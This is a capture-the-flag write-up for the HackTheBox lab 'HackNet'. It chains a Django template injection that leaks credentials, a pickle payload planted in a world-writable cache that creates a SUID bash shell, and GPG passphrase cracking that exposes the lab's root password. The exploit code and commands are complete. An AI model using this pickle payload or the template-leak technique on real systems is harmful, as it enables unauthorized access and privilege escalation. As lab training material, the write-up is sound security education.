---
title: 0.1-Hacknet
date: '2026-09-25'
category: ctf
description: ''
tags:
  - htb
  - hacking
draft: false
---

# HackNet: A Leaking Template, a Writable Cache, and an Encrypted Backup

I began HackNet at `10.10.11.85` with a small attack surface: SSH on port 22 and an nginx-hosted site on port 80. The site redirected to `hacknet.htb`. What looked like an ordinary profile feature became the first entry point, and a writable Django cache later provided the route from a web account to another local user.

## A profile name that became a template

My initial scan identified Debian OpenSSH 9.2p1 and nginx 1.22.1:

~~~bash
nmap -sC -sV -T4 -o hacknet.nmap 10.10.11.85
~~~

While using the application, I noticed that profile names appeared inside the markup for post likes. I changed my account’s username to `{{ users.0.email }}`, liked a post, and requested the likes listing at `/likes/23`. Instead of displaying those braces literally, the server rendered a user’s email:

~~~html
<div class="likes-review-item">
  <a href="/profile/34"><img src="/media/profile.png" title="mikey@hacknet.htb"></a>
</div>
~~~

That response established the useful part of the bug: the username was evaluated as a template expression in a context containing a `users` collection. I then changed my username to `{{ users.0.password }}` and revisited the likes view. The same `title` attribute exposed `mYd4rks1dEisH3re`. This was a sensitive-data leak through server-side template evaluation; I did not need to turn it into command execution to make progress.

The recovered credential, `mikey:mYd4rks1dEisH3re`, worked over SSH:

~~~bash
ssh mikey@10.10.11.85
~~~

## The cache file I could replace

As `mikey`, I inspected writable directories and found `/var/tmp/django_cache`. Its mode was `0777` even though `sandy` owned the directory. Initially it contained no useful files; performing a search in the web application created several `.djcache` entries. Repeating the same search mattered because it caused the application to revisit the relevant cache entry.

~~~bash
find / -type d -writable 2>/dev/null
ls -ld /var/tmp/django_cache
ls -la /var/tmp/django_cache
~~~

Django’s filesystem cache stores serialized values. A user who can replace a cache file can supply a malicious Python pickle; when the application loads that entry, unpickling can invoke attacker-chosen code. The existing entry was owned by `sandy` and initially resisted direct overwriting. I kept trying to create a file at the same cache path until the application removed the original entry. The payload used `pickle.__reduce__` to create a SUID copy of Bash owned by `sandy`:

~~~python
import os
import pickle
import time

class Exploit:
    def __reduce__(self):
        cmd = (
            "bash -c '"
            "cp /bin/bash /tmp/sandybash; "
            "chown sandy /tmp/sandybash; "
            "chmod 4755 /tmp/sandybash'"
        )
        return os.system, (cmd,)

cache_path = "/var/tmp/django_cache/83f3121017a1db6630d5a6d4f6125cfe.djcache"

while True:
    try:
        with open(cache_path, "wb") as cache_file:
            pickle.dump(Exploit(), cache_file)
        break
    except PermissionError:
        time.sleep(30)
~~~

The filename was the entry I observed in this run; cache filenames depend on the search and application state. Once the write succeeded, I repeated the search and found `/tmp/sandybash`. Invoking it with `-p` retained its effective user ID:

~~~bash
python3 poison_cache.py
/tmp/sandybash -p
~~~

This was the critical local trust boundary. Writable cache storage became input to the web process running with `sandy`’s privileges.

## A backup key and a password in chat data

With `sandy`’s access I found an armored GPG key in `/home/sandy/.gnupg/private-keys-v1.d/armored_key.asc`. I extracted its passphrase hash with `gpg2john` and recovered `sweetheart`. The key identified itself as Sandy’s backup key, which directed my attention to `/var/www/backups/backup02.sql.gpg`.

After transferring the encrypted backup and key to my working machine, I imported the key and decrypted the SQL dump:

~~~bash
gpg2john armored_key.asc > gpg.hash
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
gpg --import armored_key.asc
gpg --decrypt backup02.sql.gpg | grep pass
~~~

One chat entry in the backup gave away the root password verbatim: `h4ck3rs4re3veRywh3re99`. That password completed the route to root described in my notes.

The two decisive failures on HackNet were separate. Rendering a profile name as a template leaked another user’s credential; a cache directory writable by that newly obtained account let a serialized cache value execute as `sandy`. The encrypted backup still protected its contents until Sandy’s recoverable key passphrase connected the last step.

Further reading: [Django’s filesystem-cache warning](https://docs.djangoproject.com/en/5.2/topics/cache/#filesystem-caching).
